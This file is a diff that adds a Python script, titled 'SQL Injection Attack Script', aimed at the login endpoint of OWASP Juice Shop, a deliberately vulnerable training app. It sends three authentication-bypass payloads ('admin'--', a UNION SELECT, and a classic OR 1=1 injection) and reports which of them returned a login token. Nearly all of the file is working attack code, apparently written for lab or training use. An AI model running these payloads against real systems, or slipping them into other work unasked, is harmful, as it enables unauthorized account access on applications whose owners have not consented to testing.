@@ -1,0 +1,115 @@
+#!/usr/bin/env python3
+# SQL Injection Attack Script
+# For educational purposes only
+
+import requests
+import json
+import time
+
+def test_sql_injection(target_ip, payload_username, payload_password):
+    # Test SQL injection on Juice Shop login
+    login_url = f"http://{target_ip}:3000/rest/user/login"
+    
+    payload = {
+        "email": payload_username,
+        "password": payload_password
+    }
+    
+    headers = {
+        "Content-Type": "application/json"
+    }
+    
+    try:
+        response = requests.post(login_url, json=payload, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            response_data = response.json()
+            if "authentication" in response_data and "token" in response_data["authentication"]:
+                return True, "SQL injection successful - bypassed login!"
+            else:
+                return False, "Login response received but no token found"
+        else:
+            return False, f"HTTP {response.status_code} - Login failed"
+            
+    except requests.exceptions.Timeout:
+        return False, "Request timeout"
+    except requests.exceptions.ConnectionError:
+        return False, "Connection error"
+    except Exception as e:
+        return False, f"Error: {str(e)}"
+
+def main():
+    print("SQL Injection Attack Script")
+    print("Educational use only!")
+    print("")
+    
+    # Get target IP
+    target_ip = input("Enter Juice Shop IP address: ")
+    
+    # Test connection
+    print(f"Testing connection to {target_ip}:3000...")
+    try:
+        response = requests.get(f"http://{target_ip}:3000", timeout=5)
+        print("Connection successful!")
+    except:
+        print("Cannot reach target. Make sure Juice Shop is running.")
+        return
+    
+    print("")
+    print("Testing SQL injection payloads...")
+    print("")
+    
+    # SQL injection payloads
+    payloads = [
+        {
+            "name": "Admin bypass attempt",
+            "username": "admin'--",
+            "password": "anything"
+        },
+        {
+            "name": "Union injection test",
+            "username": "' UNION SELECT 1,'admin','password' --",
+            "password": "test"
+        },
+        {
+            "name": "Classic OR injection",
+            "username": "' or '1'='1' --",
+            "password": "' or '1'='1' --"
+        }
+    ]
+    
+    successful_attacks = []
+    
+    for i, payload in enumerate(payloads, 1):
+        print(f"[{i}/{len(payloads)}] Testing: {payload['name']}")
+        print(f"  Username: {payload['username']}")
+        print(f"  Password: {payload['password']}")
+        
+        success, message = test_sql_injection(target_ip, payload['username'], payload['password'])
+        
+        if success:
+            print(f"  Result: SUCCESS - {message}")
+            successful_attacks.append(payload['name'])
+        else:
+            print(f"  Result: FAILED - {message}")
+        
+        print("")
+        time.sleep(1)  # Small delay between attempts
+    
+    # Show results
+    print("=== Attack Results ===")
+    if successful_attacks:
+        print(f"Successful SQL injections: {len(successful_attacks)}")
+        for attack in successful_attacks:
+            print(f"  ✓ {attack}")
+        print("")
+        print("WARNING: Application is vulnerable to SQL injection!")
+    else:
+        print("No successful SQL injections found")
+        print("Application may be protected against SQL injection")
+    
+    print("")
+    print("Attack finished.")
+
+if __name__ == "__main__":
+    main()
